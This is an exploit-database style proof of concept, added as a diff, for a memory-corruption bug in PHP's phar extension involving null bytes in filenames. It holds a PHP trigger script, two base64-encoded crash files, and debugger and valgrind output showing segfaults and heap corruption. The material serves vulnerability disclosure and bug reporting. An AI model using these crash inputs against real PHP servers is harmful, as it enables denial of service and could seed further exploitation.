@@ -1,0 +1,200 @@
+# Exploit Title: Invalid memory write in phar on filename with \0 in name
+# Date: 2016-03-19
+# Exploit Author: @vah_13
+# Vendor Homepage: https://secure.php.net/
+# Software Link: https://github.com/php/php-src
+# Version: 5.5.33
+# Tested on: Linux
+
+
+
+Test script:
+---------------
+cat test.php
+-------------------
+<?php
+$testfile = file_get_contents($argv[1]);
+try {
+    $phar = new Phar($testfile);
+    $phar['index.php'] = '<?php echo "https://twitter.com/vah_13 ?>';
+    $phar['index.phps'] = '<?php echo "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"; ?>';
+    $phar->setStub('<?php
+Phar::webPhar();
+__HALT_COMPILER(); ?>');
+} catch (Exception $e) {
+        print $e;
+}?>
+----------------------------------------------------------------------------------
+
+PoC 1
+
+root@TZDG001:/tmp/data2# base64 ret/crash13
+CkTJu4AoZHKCxhC7KlDNp2g5Grx7JE092+gDAADJVR1EZS8vL/oAAPovLy8v5y8vLy9lZWVlZWVl
+DAwMC+MMDAwMDM4MDAwgBwwMDAwMDAxQDC8uLi8jLy88Ly8u+C8vLxERERERERERpXRDbnQgdGhh
+dCBtVnJrV3h4eHh4eNt4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4ePh4Ly8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLkYvLy8vLy8vLy8vLy9kJy8vLy8vLy8vLy8v8+TzMZovLysvLy8vL3l5eXl5
+eXl5eXkpIHsEAAYgICAveHh4eHh4eHh4eAF4AAJ4eP8vIExvYWQgY29tbWFuZChTgG5lIHV0aWxp
+dHkKICAgIGluY2yKZGUuLi4uLi4uLi4uPCYuLi4ucG1kLnBoYXIudmVKCiAgJCAvLyBSdegDIGxp
+bmUgTW50ZXJmYWxlCiAgIBxleGkAAP//SFBNRFxUZXh0VUl5Q29tbWFuZAAANwAAAHNyY1Rf/39N
+UElMRVIodjsgPz4MChAAAAANAgAAEP//+QEAAAAAAAAiAAAqAAAAlnJjL21haW4vlA8uLlEvci8u
+LhAA2GVzZXRzL2NsZWFucipeTUxSZW5kZXLJYEC2IQAAAABjb3JlrgAAAAAAI2OcwrYAAAAAAA0A
+NwAAAHMASRwAc2V0cy91bndzcmMAnjgjW7gwgAAAcmMAAgAAADN1bGVzZXRzL2MgAAAAb///f/9p
+YWwueG1s4BIAAB+u4VZzcmMvbWFpbi9yZXNvdXJpZ24ueABzcmMvbQA9dr2itiEASRyXl5eXl5eX
+l5etl5eXlwAMc3JjL21hW24v6Bvzb3VyY2VzL3J1//+AAHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0
+dHR0dHR0WWV0cy9uYRwcMBwcHBwcHBwcAB+u4TSoCwD1A3lvdXJjZXMvdmVsb2Qxmi9LZ01yAB+u
+4RgAACCu4VbjDy5nLnhtbP8vAC4uLjwmLnh4eHh4eHh4eHh4+HgZLy8vLi4ucG1kLnBoL3Jlc291
+cmNjZXNzcgCAAAAuGnVzc3IvLg0AAHFF7BMAc3JjL/9haW4vcGhwL1BIUE1EL1BhcnMnJycnJycn
+JycnJycnJyfnAAAKQ5bxci5waHBtGAAAH67hGAAAH67hVuMPLi5RLy8vLy8vc3JW4QcAANevurC2
+IQAAAAcAACwvdXNyLy4uL1KHAK78Vm4vcGhwL1BIUE1EL1JlbmRlcmVyKl5NTFJlbmRlcslgQLYh
+AAAAAAAAGwABAHNyYy9tYWluL3BoNy9QSFBNRC9SdVRlLnCAcDIYAAAfruEAAHNyYy9tYWluL3AA
+iy0AAABzcmMAAFeu4VYwCAAAPXa9oi8vLy8vLy8vLy8vLy8vLy8vL28v8+TzOoAAAGhwL1D/CzpE
+ZXZlbG9kMZovbmdNZXRob2QQcGiKlgwAIAAAAFb8BQAAI2OcwrYhAAAAACAANwAAAGNyYy9tYc7O
+zs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs4AEa7hVnNyYy+A////L9YhzLYhAADg////MXBo
+cC9QSFBNRC9PdW1hf24vcGhwL1BIUGFEUFBQUFBQUFByYy9tYWluL3BocC9QSFBNRC9SdWxML0Rl
+c2lnZy9Ub29PYW55TWV0aG9kfy4fruFWYy9tYWluL3BocC9QSFBNRC9SdWxlL0Rlc2lnbi8vRGV2
+ZWxvZFxlbnRDbwMAAGMvbQA9dr2itiEASRwAcG1kLnARruFWjwUF//8FcIWYAAIAAAAvLi4v////
+/3JILi4vLi91c3IvLi4AADYAAABecmMvUEhQTUQvUnVsZS9EZXNpZ1svV2VpAGhwAAAAc3JjLy8v
+LwAAAQDk8zGaLy//L1J1bGUvRJCQkJBAkJCQkJDQkJBzkJCQkJCQkJCQkJCQkJCQkG50cm9w6HAu
+LgAAAQAuLi4uLi4uLi4uL1BIUE1EL091bWFpdi9waHAvUEhQTURlcgAEQ2hpbGRyZW4ucGhwbQsA
+AB+u4VZ+BQAAgLP4+7Yh3////wAOAAAfruxWbQYAADplbi4vdf//Ly4u5i4vdQBkHwAD6AAD6AAN
+ADcuLhAA2DUAAAAyAAAAc3JkLy8uLi8uL1Jzci4vdXNycGguUS8vLy9/AAAAL3Vzci+uQi8uL3Vz
+ci8vLi98c3IvLhciLi91c3IvLi4vdXOALy4uL/////9ldHMvYyAAAABv//9//2lhbC54tbW1tbW1
+tbW1tbW1vABjL+ZJTnUgZC4vc5QPAAAEAHIvLi4vdXNyLy4uLy4vdXNyLy4AZC4vAQAAAC4uL3UQ
+AC8uLi8uL3Vzby4vdXNyDy4uUS8vLy8vL3NyLy4vc3IvLi4odXNyAAIAAC4vdXNzci8uLi91e3Iv
+rkIvLmRvci9hdRAA2DVXu7YhABcuL3Vzci8uAS8u
+
+
+(gdb) r  test.php ret/crash13
+Starting program: /tmp/php-7.0.4/sapi/cli/php test.php ret/crash13
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+zend_string_init (persistent=0, len=2, str=0x121a64c "->") at
+/tmp/php-7.0.4/Zend/zend_string.h:157
+157    zend_string *ret = zend_string_alloc(len, persistent);
+(gdb) i r
+rax            0xae6572  11429234
+rbx            0x7fffffffa880  140737488332928
+rcx            0x64c  1612
+rdx            0x2  2
+rsi            0x3  3
+rdi            0xae658a  11429258
+rbp            0x2  0x2
+rsp            0x7fffffffa7e0  0x7fffffffa7e0
+r8             0xfffffffffffffffb  -5
+r9             0x1  1
+r10            0x3  3
+r11            0x1214fc0  18960320
+r12            0x1206b7a  18901882
+r13            0x4  4
+r14            0x121a64c  18982476
+r15            0x7fffffffa880  140737488332928
+rip            0xd531b4  0xd531b4 <add_assoc_string_ex+116>
+eflags         0x10206  [ PF IF RF ]
+cs             0x33  51
+ss             0x2b  43
+ds             0x0  0
+es             0x0  0
+fs             0x0  0
+gs             0x0  0
+
+*****************************************************************
+
+PoC 2
+
+root@dns:~/php-src# base64 ./bck_out/6648
+Ly4vdXNyLy4uLy4vdXNy4uLi4uLi4uLi4uLi4uLi4uLi4uLit7e3t7dhI1VmbH8AIGdsb1Rh/39i
+b25ziGFudCB0AYCAIG1QX1CKRQAAgABFQVMsJywgJ3BoYXInKXNfLy4uLy4vU3NyLy4uL31zci8u
+LjwuL3Vzci8ubWFxUGhhciggJ3Bokm1kLnBoYXIAAAB/CgovL4iInoiIiIiIiIh1Li9//+ggQ29u
+ZmlndXJcB2lCY2x1ZC91c3IvLoiJiIiIiKKIiIiIXFxcXFxHXFxcXFxcXFxcXFxciA0uL3VzcmUg
+cC8uLi91c3IvLi4uL3MQLy4ULxEvgHNyNiBpbmNsdWQv9G8gdXNcIHRoaXMgcGhhctlzZXRfaW5j
+iYgmMSYmJiY4/e3t7WFyI2VmaW5lIGdsb1T/FhYWFhYWFhYWFhYWFhYWFhYWFhYWaGFyJyk7Co5k
+ZV9wYXRoKCkpOxYKaWYgKGlzjn+UKCRhcmV2KSAmJiByZWEvdXNyLy4QLy4vdXNyLy4uL31zci8u
+LjwuL3Vzci8u5i91c3IvLi4vLi91c3IuLj0ndXNyLy4uEADJci8uJi8uL3VzEC9AEhwuL3NyLy4u
+L3Vzci8uLi8uL2lziz4uLi8uL3Vzci8oLi91bmNsdWQvdVNyLy6IiIikiIiIcwAgLi5y3zouLy4v
+JiYmJlMmJiYmOBDt7e0=
+
+
+./bck_out/6648
+
+==4103== Source and destination overlap in memcpy(0x6e5d800, 0x6e5d798, 291)
+==4103==    at 0x4C2D75D: memcpy@@GLIBC_2.14 (vg_replace_strmem.c:915)
+==4103==    by 0x6AD1B5: _estrdup (zend_alloc.c:2558)
+==4103==    by 0x6880FD: php_stream_display_wrapper_errors (streams.c:152)
+==4103==    by 0x68AE4B: _php_stream_opendir (streams.c:1994)
+==4103==    by 0x5E986A: spl_filesystem_dir_open (spl_directory.c:236)
+==4103==    by 0x5ED77F: spl_filesystem_object_construct (spl_directory.c:724)
+==4103==    by 0x6C1655: zend_call_function (zend_execute_API.c:878)
+==4103==    by 0x6EBF92: zend_call_method (zend_interfaces.c:103)
+==4103==    by 0x5A44A8: zim_Phar___construct (phar_object.c:1219)
+==4103==    by 0x75D143: ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER
+(zend_vm_execute.h:1027)
+==4103==    by 0x70CFBA: execute_ex (zend_vm_execute.h:423)
+==4103==    by 0x76D496: zend_execute (zend_vm_execute.h:467)
+==4103==
+==4103== Invalid read of size 8
+==4103==    at 0x6ACEC3: zend_mm_alloc_small (zend_alloc.c:1291)
+==4103==    by 0x6ACEC3: zend_mm_alloc_heap (zend_alloc.c:1362)
+==4103==    by 0x6ACEC3: _emalloc (zend_alloc.c:2446)
+==4103==    by 0x6DC4E0: zend_hash_real_init_ex (zend_hash.c:140)
+==4103==    by 0x6DC4E0: zend_hash_check_init (zend_hash.c:163)
+==4103==    by 0x6DC4E0: _zend_hash_add_or_update_i (zend_hash.c:563)
+==4103==    by 0x6DC4E0: _zend_hash_str_update (zend_hash.c:667)
+==4103==    by 0x6D21FE: zend_symtable_str_update (zend_hash.h:407)
+==4103==    by 0x6D21FE: add_assoc_str_ex (zend_API.c:1384)
+==4103==    by 0x6E8AA6: zend_fetch_debug_backtrace
+(zend_builtin_functions.c:2670)
+==4103==    by 0x6EDB3A: zend_default_exception_new_ex (zend_exceptions.c:213)
+==4103==    by 0x6D1DBA: _object_and_properties_init (zend_API.c:1311)
+==4103==    by 0x429178: zend_throw_exception (zend_exceptions.c:877)
+==4103==    by 0x4292A5: zend_throw_error_exception (zend_exceptions.c:910)
+==4103==    by 0x42639C: php_error_cb (main.c:1041)
+==4103==    by 0x427F4B: zend_error (zend.c:1163)
+==4103==    by 0x426FFD: php_verror (main.c:897)
+==4103==    by 0x427306: php_error_docref1 (main.c:921)
+==4103==  Address 0x5c5c5c5c5c5c5c5c is not stack'd, malloc'd or
+(recently) free'd
+==4103==
+==4103==
+==4103== Process terminating with default action of signal 11 (SIGSEGV)
+==4103==  General Protection Fault
+==4103==    at 0x6ACEC3: zend_mm_alloc_small (zend_alloc.c:1291)
+==4103==    by 0x6ACEC3: zend_mm_alloc_heap (zend_alloc.c:1362)
+==4103==    by 0x6ACEC3: _emalloc (zend_alloc.c:2446)
+==4103==    by 0x6DC4E0: zend_hash_real_init_ex (zend_hash.c:140)
+==4103==    by 0x6DC4E0: zend_hash_check_init (zend_hash.c:163)
+==4103==    by 0x6DC4E0: _zend_hash_add_or_update_i (zend_hash.c:563)
+==4103==    by 0x6DC4E0: _zend_hash_str_update (zend_hash.c:667)
+==4103==    by 0x6D21FE: zend_symtable_str_update (zend_hash.h:407)
+==4103==    by 0x6D21FE: add_assoc_str_ex (zend_API.c:1384)
+==4103==    by 0x6E8AA6: zend_fetch_debug_backtrace
+(zend_builtin_functions.c:2670)
+==4103==    by 0x6EDB3A: zend_default_exception_new_ex (zend_exceptions.c:213)
+==4103==    by 0x6D1DBA: _object_and_properties_init (zend_API.c:1311)
+==4103==    by 0x429178: zend_throw_exception (zend_exceptions.c:877)
+==4103==    by 0x4292A5: zend_throw_error_exception (zend_exceptions.c:910)
+==4103==    by 0x42639C: php_error_cb (main.c:1041)
+==4103==    by 0x427F4B: zend_error (zend.c:1163)
+==4103==    by 0x426FFD: php_verror (main.c:897)
+==4103==    by 0x427306: php_error_docref1 (main.c:921)
+Segmentation fault
+
+Program received signal SIGSEGV, Segmentation fault. zend_mm_alloc_small
+(size=<optimized out>, bin_num=16, heap=0x7ffff6000040) at
+/root/php_bck/Zend/zend_alloc.c:1291 1291 heap->free_slot[bin_num] =
+p->next_free_slot; (gdb) i r rax 0x5c5c5c5c5c5c5c5c 6655295901103053916 rbx
+0x8 8 rcx 0x10 16 rdx 0x7ffff60000c0 140737320583360 rsi 0x10 16 rdi 0x120
+288 rbp 0x7ffff6000040 0x7ffff6000040 rsp 0x7fffffffa230 0x7fffffffa230 r8
+0xf74460 16204896 r9 0x7ffff6013170 140737320661360 r10 0x0 0 r11 0x101 257
+r12 0x7ffff605c658 140737320961624 r13 0x7ffff605c640 140737320961600 r14
+0x7ffff60561f8 140737320935928 r15 0x8439b8 8665528 rip 0x6acec3 0x6acec3
+<_emalloc+115> eflags 0x10206 [ PF IF RF ] cs 0x33 51 ss 0x2b 43 ds 0x0 0
+es 0x0 0 fs 0x0 0 gs 0x0 0
+
+
+https://bugs.php.net/bug.php?id=71860
+
+https://twitter.com/vah_13
+
+https://twitter.com/ret5et
